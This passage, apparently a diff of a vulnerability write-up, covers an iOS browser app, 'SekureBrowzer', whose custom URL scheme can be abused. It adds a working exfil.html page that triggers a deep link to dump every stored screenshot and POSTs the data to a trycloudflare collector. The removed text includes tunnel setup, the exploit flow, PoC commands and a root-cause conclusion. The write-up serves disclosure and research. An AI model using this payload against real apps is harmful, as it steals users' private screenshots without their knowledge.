 ```
 
-```bash
-$ python3 collector_server.py
-[*] SekureBrowzer PoC collector listening on http://0.0.0.0:8000/collect
-[*] Captured payloads will be saved under captured/ folder
+### exfil.html
+
+```html
+<!-- exfil.html -->
+<!DOCTYPE html>
+<html>
+<head><meta charset="UTF-8"><title>Processing...</title></head>
+<body>
+<h3>Exfiltrating Stored Screenshots</h3>
+<p id="status" style="color:#666; font-size:12px;"></p>
+<pre id="stolen-data" style="white-space:pre-wrap;word-break:break-all;border:1px solid #ccc;padding:10px;display:none;"></pre>
+
+<script>
+const STATUS = document.getElementById('status');
+const STOLEN = document.getElementById('stolen-data');
+const COLLECTOR = 'https://archive-oriented-imagine-warner.trycloudflare.com/collect';
+
+function log(msg) {
+  const ts = new Date().toISOString().split('T')[1].split('.')[0];
+  STATUS.textContent = `[${ts}] ${msg}`;
+  console.log(msg);
+}
+
+function triggerDeepLink(url) {
+  const link = document.createElement('a');
+  link.href = url;
+  link.style.display = 'none';
+  document.body.appendChild(link);
+  link.click();
+  document.body.removeChild(link);
+}
+
+function runExfil() {
+  setTimeout(() => {
+    log('Step 1: Triggering getAll (retrieve all screenshots)...');
+    triggerDeepLink("sekurebrowzer://anyhost?dbCommand=getAll");
+
+    setTimeout(() => {
+      log('Step 2: Reading DOM and posting to collector...');
+      const data = STOLEN.textContent;
+      if (!data || data.length === 0) {
+        log('ERROR: No data in #stolen-data div. getAll may have failed.');
+        return;
+      }
+
+      log('Step 3: Sending POST (staying on page)...');
+
+      // Use fetch() with URL-encoded form data
+      const params = new URLSearchParams();
+      params.append('dump', data);
+
+      fetch(COLLECTOR, {
+        method: 'POST',
+        headers: {
+          'Content-Type': 'application/x-www-form-urlencoded'
+        },
+        body: params.toString()
+      })
+      .then(response => {
+        log('✓ Data exfiltrated successfully. Response: ' + response.status);
+        return response.text();
+      })
+      .catch(error => {
+        log('✗ Exfil failed: ' + error);
+      });
+    }, 3000);
+    
+  }, 3000);
+}
+
+// Auto-run exfil when page loads
+log('Page loaded. Screenshot captured. Starting exfil chain...');
+runExfil();
+</script>
+
+</body>
+</html>
 ```
-
-Since the PoC testing didn't have a routable public host, `cloudflared tunnel` was used to expose the local collector to the iOS device: `cloudflared tunnel --url http://localhost:8000` yields a temporary HTTPS domain, e.g., `https://my-tunnel-domain.trycloudflare.com`. That domain was then substituted into both `exploit.html` (the `url=` parameter) and `exfil.html` (the collector endpoint), so the SekureBrowzer app could reach the attacker's pages and the pages could reach the collector from the device's network.
-
-```bash
-$ cloudflared tunnel -url http://localhost:8000
-INF Requesting new quick Tunnel on trycloudflare.com...
-INF +--------------------------------------------------------------------------------------------+
-INF |  Your quick Tunnel has been created! Visit it at (it may take some time to be reachable):  |
-INF |  https://my-tunnel-domain.trycloudflare.com                                 |
-INF +--------------------------------------------------------------------------------------------+
-...
-```
-
-### Zero Additional User Interaction
-
-The attack is fully automatic after the victim opens the initial link, full screenshot history exfiltrated with **zero additional taps** after opening the initial link. 
-
-The end-to-end flow:
-```
-https://my-tunnel-domain.trycloudflare.com/exploit.html (open in SekureBrowzer)
-    │
-    ▼
-window.location = "sekurebrowzer://anyhost?url=https://my-tunnel-domain.trycloudflare.com/exfil.html&takeScreenshot=true"
-    │
-    ├── silently screenshot current page                                        (RC2)
-    └── navigate WebView to exfil.html
-            │
-            ▼
-exfil.html loads, auto-fires: window.location = "sekurebrowzer://anyhost?dbCommand=getAll"
-            │
-            ▼
-_processDataCommand("getAll") executes:
-    ├── StorageManager.getAllScreenshotsAsJson()  ──▶  exports all screenshots
-    └── runJavaScript(inject into #stolen-data div)  ──▶  (RC3 + RC4)
-            │
-            ▼
-page-side JS polls #stolen-data, reads JSON when populated
-            │
-            ▼
-fetch POST to https://my-tunnel-domain.trycloudflare.com/collect
-            │
-            ▼
-local collector: base64-decode images → write PNG/JPEG files
-            │
-            ▼
-match device's full screenshot history
-```
-
-### PoC
-
-```bash
-# Terminal 1: Start collector server (start this first to avoid port conflict)
-$ python3 collector_server.py 8000
-
-# Terminal 2: Start tunnel (new terminal)
-$ cloudflared tunnel --url http://localhost:8000
-# Record new generated HTTPS domain from output
-
-# Update new generated domain in exploit.html and exfil.html
-
-# Open exploit.html in SekureBrowser via tunnel using new domain
-# App automatically: screenshots → exfils → extracts images
-
-# Terminal 1 output shows:
-# [+] 127.0.0.1 -> /collect
-#     JSON: captured/20260911T103522_12345.json
-#     Images: 5 screenshots extracted and saved
-
-# Verify images extracted:
-$ ls -lh captured/*.png captured/*.jpg
-```
-
-![Exploitation PoC](https://lh3.googleusercontent.com/pw/AP1GczMuTndkEpv1_bh5sK6JpL11T-Ya-pfxbJ8GeL1G7IGNb72yD6KHV2dFH0-2VyTwCAFFHOMjfd3OBvUkA9RyOytLSPAsWoHswyETU0mRfvjqwmBCArw1qT0QtCTPbBTbGJmLh9AC3aTjOUWTRpnEWL2V=w1920-h1156-s-no-gm)
-_**Figure: Exploitation PoC**_
-
-## Conclusion
-
-The whole vulnerable surface comes down to one decision: letting an unauthenticated, externally-triggerable custom URL scheme reach directly into a silent capture routine and a bulk-export-then-inject pipeline, with the same no-origin-check WebView JS sink handling everything from normal page navigation to dumping the local database. No jailbreak and no memory corruption were needed — every step above is static analysis plus two Frida hooks against normal, working Dart control flow. The one piece still resting on inference rather than a captured trace is the exact literal comparison `_processDataCommand` runs against `dbCommand`'s three branch values; everything upstream of that — the scheme check, the parameter extraction, the reachability of the export methods — is confirmed.
-
-The Dart AOT layer made this a different exercise from a typical native iOS challenge: `strings` and library-id clustering got a fast working hypothesis, but confirming it needed reFlutter's instrumented snapshot dump to get real function symbols into IDA, then targeted Frida hooks on two runtime-only structures — the object pool (`X27`) and the dispatch table (`X21`) — to pull out the literal strings and resolved call targets that don't exist until the process is running. The remaining gap is a live trace of `-[WKWebView evaluateJavaScript:completionHandler:]` to catch the exact injected JS on a running instance; static analysis alone gets everything up to that point.
